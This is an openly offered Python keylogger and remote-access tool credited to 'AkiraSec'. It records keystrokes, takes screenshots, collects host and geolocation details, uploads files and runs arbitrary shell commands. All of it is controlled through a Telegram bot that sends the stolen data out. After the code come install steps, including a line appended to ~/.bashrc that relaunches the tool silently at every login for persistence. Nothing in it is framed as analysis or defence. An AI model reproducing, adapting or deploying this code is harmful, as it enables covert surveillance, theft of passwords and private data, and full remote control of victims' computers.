# keylogger.py
# Developed by AkiraSec | Telegram: @rootakira

import os
import platform
import socket
import requests
import threading
import time
from io import BytesIO
from pynput import keyboard
import psutil
import subprocess

try:
    from PIL import ImageGrab
except ImportError:
    ImageGrab = None

# === CONFIGURATION ===
BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
CHAT_ID = "YOUR_CHAT_ID"
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
log = []
logging_enabled = True
# ======================

# --- Send Telegram Message ---
def send_message(text):
    try:
        requests.post(f"{API_URL}/sendMessage", data={
            "chat_id": CHAT_ID,
            "text": text
        })
    except Exception as e:
        print(f"[!] Telegram error: {e}")

# --- Send Screenshot ---
def send_screenshot():
    if not ImageGrab:
        send_message("‚ùå Screenshot failed: Pillow not available.")
        return
    try:
        img = ImageGrab.grab()
        bio = BytesIO()
        img.save(bio, format="PNG")
        bio.seek(0)
        requests.post(f"{API_URL}/sendPhoto", data={"chat_id": CHAT_ID}, files={"photo": bio})
    except Exception as e:
        send_message(f"‚ùå Screenshot error: {e}")

# --- Get IPs ---
def get_ip_addresses():
    ip_list = []
    for iface_name, iface_addrs in psutil.net_if_addrs().items():
        for addr in iface_addrs:
            if addr.family.name == 'AF_INET' and not addr.address.startswith("127."):
                ip_list.append(f"{iface_name}: {addr.address}")
    return "\n".join(ip_list)

# --- System Info ---
def get_system_info():
    user = os.getenv("USER") or os.getenv("USERNAME")
    hostname = socket.gethostname()
    system = platform.system()
    release = platform.release()
    local_ips = get_ip_addresses()
    try:
        geo = requests.get("https://ipinfo.io", timeout=5).json()
        external_ip = geo.get("ip")
        region = geo.get("region")
        country = geo.get("country")
        loc = geo.get("loc")
    except:
        external_ip = region = country = loc = "N/A"

    return (
        f"üë§ User: {user}\n"
        f"üíª OS: {system} {release}\n"
        f"üñ•Ô∏è Hostname: {hostname}\n"
        f"üåê Local IPs:\n{local_ips}\n"
        f"üåç External IP: {external_ip}\n"
        f"üìç Region: {region}, {country}\n"
        f"üìå Coords: {loc}"
    )

# --- Keylogger Thread ---
def keylog_worker():
    def on_press(key):
        if not logging_enabled:
            return
        try:
            log.append(key.char)
        except AttributeError:
            log.append(f"[{key.name}]")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# --- Periodic Keystroke Sender ---
def send_keys_periodically():
    while True:
        if logging_enabled and log:
            keys = ''.join(log)
            if len(keys) > 4000:
                keys = keys[-4000:]
            send_message("‚å®Ô∏è Keystrokes:\n" + keys)
            log.clear()
        time.sleep(60)

# --- Shell Command Execution ---
def run_shell_command(command):
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=10)
        result = result.decode('utf-8', errors='ignore')
        if len(result) > 4000:
            result = result[-4000:]
        send_message("üìü Output:\n" + result)
    except Exception as e:
        send_message(f"‚ùå Error: {e}")

# --- Upload file ---
def upload_file(path):
    if not os.path.exists(path):
        send_message("‚ùå File not found.")
        return
    try:
        with open(path, "rb") as f:
            requests.post(f"{API_URL}/sendDocument", data={"chat_id": CHAT_ID}, files={"document": f})
    except Exception as e:
        send_message(f"‚ùå Upload failed: {e}")

# --- Command Handler ---
def handle_command(text):
    global logging_enabled
    if text == '/start':
        logging_enabled = True
        send_message("‚úÖ Keylogger started.")
    elif text == '/stop':
        logging_enabled = False
        send_message("üõë Keylogger stopped.")
    elif text == '/info':
        send_message(get_system_info())
    elif text == '/key':
        keys = ''.join(log) if log else "No keys yet."
        if len(keys) > 4000:
            keys = keys[-4000:]
        send_message("‚å®Ô∏è Keystrokes:\n" + keys)
    elif text == '/screenshot':
        send_screenshot()
    elif text == '/reboot':
        send_message("üîÅ Rebooting...")
        os.system("reboot")
    elif text == '/shutdown':
        send_message("üõë Shutting down...")
        os.system("sudo shutdown now")
    elif text.startswith('/shell'):
        cmd = text.replace('/shell', '', 1).strip()
        if cmd:
            run_shell_command(cmd)
        else:
            send_message("‚ö†Ô∏è Usage: /shell <command>")
    elif text.startswith('/upload'):
        path = text.replace('/upload', '', 1).strip()
        if path:
            upload_file(path)
        else:
            send_message("‚ö†Ô∏è Usage: /upload <filepath>")
    elif text == '/help':
        send_message(
            "ü§ñ Commands:\n"
            "/start - Start logger\n"
            "/stop - Stop logger\n"
            "/key - Keystrokes\n"
            "/info - System info\n"
            "/screenshot - Screenshot\n"
            "/reboot - Reboot system\n"
            "/shutdown - Power off\n"
            "/shell <cmd> - Run command\n"
            "/upload <path> - Upload file\n"
            "/help - This list"
        )
    else:
        send_message("‚ùì Unknown command. Use /help")

# --- Telegram Polling Thread ---
def telegram_listener():
    last_update_id = 0
    while True:
        try:
            res = requests.get(f"{API_URL}/getUpdates", timeout=10).json()
            updates = res.get("result", [])
            for update in updates:
                update_id = update["update_id"]
                if update_id > last_update_id:
                    last_update_id = update_id
                    msg = update.get("message", {})
                    chat_id = str(msg.get("chat", {}).get("id", ""))
                    text = msg.get("text", "")
                    if chat_id == str(CHAT_ID):
                        handle_command(text.strip())
        except Exception as e:
            print(f"[!] Polling error: {e}")
        time.sleep(3)

# --- MAIN ---
if __name__ == "__main__":
    # Send initial system info and screenshot
    send_message("üì° Keylogger launched. Use /help.")
    send_message(get_system_info())
    send_screenshot()

    # Start threads
    threading.Thread(target=keylog_worker, daemon=True).start()
    threading.Thread(target=send_keys_periodically, daemon=True).start()
    threading.Thread(target=telegram_listener, daemon=True).start()

    # Keep alive
    while True:
        time.sleep(10)


pip3 install --user pynput psutil requests pillow # modules






nano keylogger.py

echo 'nohup python3 ~/keylogger.py >/dev/null 2>&1 &' >> ~/.bashrc

nohup python3 ~/keylogger.py >/dev/null 2>&1 &
